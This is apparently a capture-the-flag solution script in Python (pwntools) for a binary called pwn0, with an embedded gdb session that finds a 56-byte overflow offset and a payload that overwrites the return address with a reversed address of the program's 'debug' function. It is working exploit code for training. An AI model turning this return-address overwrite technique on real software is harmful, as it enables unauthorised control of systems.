#!/usr/bin/env python3
from pwn import *

elf = ELF("./pwn0")

if args.LOCAL: # run with python3 sol.py LOCAL
  p = process(elf.path)
else:
  p = remote("localhost", 9000)

# use `pwn cyclic 200`, find crash at 0x6f616161 but note, this has been reversed before the crash.
# therefore to find offset, we use pwn cyclic -l 0x6161616f which gives 56
"""
root@e6368c853402:/opt/pwn0# pwn cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
root@e6368c853402:/opt/pwn0# gdb -q pwn0
Reading symbols from pwn0...
(gdb) run
Starting program: /opt/pwn0/pwn0
Enter the string to reverse:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
baaybaaxbaawbaavbaaubaatbaasbaarbaaqbaapbaaobaanbaambaalbaakbaajbaaibaahbaagbaafbaaebaadbaacbaabbaazaaayaaaxaaawaaavaaauaaataaasaaaraaaqaaapaaaoaaanaaamaaalaaakaaajaaaiaaahaaagaaafaaaeaaadaaacaaabaaaa

Program received signal SIGSEGV, Segmentation fault.
0x6f616161 in ?? ()
(gdb) quit
A debugging session is active.

	Inferior 1 [process 29] will be killed.

Quit anyway? (y or n) y
root@e6368c853402:/opt/pwn0# pwn cyclic -l 0x6161616f
56
"""


# so we send 56 bytes of junk plus the reversed address of where we want to jump to, plus more junk to reach the same 200 byte target

# Payload before reversal looks like
# | 56 bytes of junk | reversed debug address | more junk to make total length 200 |
# After reversal it looks like
# | more junk to make total length 200 | debug address | 56 bytes of junk |
offset = 56
total = 200

debug_address = p32(elf.symbols['debug'])
reverse_debug_address = debug_address[::-1]

p.recvuntil("reverse:\n")
p.sendline(b"A" * offset + reverse_debug_address + b"A" * (total - offset - len(reverse_debug_address)))
p.interactive()